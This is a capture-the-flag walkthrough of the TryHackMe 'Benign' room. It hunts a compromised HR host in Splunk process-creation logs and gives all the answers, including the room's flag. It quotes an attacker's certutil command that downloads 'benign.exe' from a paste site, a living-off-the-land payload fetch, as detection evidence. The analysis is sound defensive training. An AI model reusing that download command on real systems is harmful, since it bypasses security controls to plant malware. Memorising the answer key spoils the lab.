---
title: Benign
module: SIEM Triage for SOC
path: SOC Level 1
platform: TryHackMe
tags: [splunk, windows-event-logs, lolbin, c2, incident-response]
status: Completed
date: 2026-07-23
date_completed: 2026-07-23
---
*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/benign-intro.png width="1500">
</p>

---

## TASK 1 - Introduction

This room investigates host-centric Windows process execution logs (Event ID 4688) ingested into Splunk under the `win_eventlogs` index, to uncover a compromised host on the network. Familiarity with Splunk basics helps here — see the splunk101 and splunk201 rooms for background.

---

## TASK 2 - Scenario: Identify and Investigate an Infected Host

### Scenario

One of the client's IDS solutions flagged suspicious process execution pointing to a compromised host in the **HR department**. Tools tied to network information gathering and scheduled tasks were run on the machine, confirming the suspicion. Due to limited resources, only the process execution logs (Event ID 4688) were pulled and ingested into Splunk under the `win_eventlogs` index for investigation.

### About the Network Information

The network is divided into three logical segments — it will help in the investigation.

**IT Department**
- James
- Moin
- Katrina

**HR department**
- Haroon
- Chris
- Diana

**Marketing department**
- Bell
- Amelia
- Deepak

---

How many logs are ingested from the month of March, 2022?

<p align="center">
<img src=screenshots/benign_total.png width="700">
</p>

**Answer: 13959**

---

Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?

<p align="center">
<img src=screenshots/benign_amelia.png width="700">
</p>

Under UserName we can only see the top 10 names by default, but there are more we can view by clicking **Rare values**, or using the filter **rare limit=20 UserName**. This is a great tool for SOCs to visually compare usernames and their usage. We immediately spot two similar entries: Amelia and Amel1a. That spelling should raise alarm bells right away — it's attempting to hide behind a legitimate account name.

**Answer: Amel1a**

---

Which user from the HR department was observed to be running scheduled tasks?

<p align="center">
<img src=screenshots/benign_chris.png width="700">
</p>

As we saw above, the **rare limit=20** filter is a powerful tool — it really narrows down commands that might have been used only once or twice, which is especially useful when hunting through a sea of commands. In this case we're looking for a scheduled task run by an HR department member. We observe the user account Chris.fort running a scheduled task (`onstart`), as well as a certutil.exe download for benign.exe. Let's keep that in mind!

Filter: `index=win_eventlogs (haroon OR "chris.fort" OR daina) | rare limit=20 CommandLine`

**Answer: Chris.fort**

---

Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host.

<p align="center">
<img src=screenshots/benign_haroon.png width="700">
</p>

In the previous question, while searching for rare commands, we spotted the download of benign.exe. We can take that same command and add it to our filter to see exactly who ran it!

Filter: `index=win_eventlogs (haroon OR "chris.fort" OR daina) CommandLine="certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"`

**Answer: haroon**

---

To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?

<p align="center">
<img src=screenshots/benign_certutil.png width="700">
</p>

As a SOC analyst, if you see the Windows process **certutil.exe** — normally used for certificate management — appear in a log while pointing to a URL and downloading a suspicious file, that's a clear indication the system has been compromised and the attacker successfully installed the malicious .exe on the host.

**Answer: certutil.exe**

---

What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)

<p align="center">
<img src=screenshots/benign_date.png width="700">
</p>

**Answer: 2022-03-04**

---

Which third-party site was accessed to download the malicious payload?

<p align="center">
<img src=screenshots/benign_url.png width="700">
</p>

In the CommandLine where we located the certutil.exe command, we can also read the suspicious URL directly.

CommandLine: `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe`

**Answer: controlc.com**

---

What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

**Answer: benign.exe**

---

The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

<p align="center">
<img src=screenshots/benign_url.png width="700">
</p>

With the full suspicious URL in hand, I dropped it into VirusTotal for analysis. It returned a website summary and a screenshot showing the site's contents, including the file flag.txt.

**Answer: THM{KJ&*H^B0}**

---

What is the URL that the infected host connected to?

**Answer: https://controlc.com/e4d11035**

---
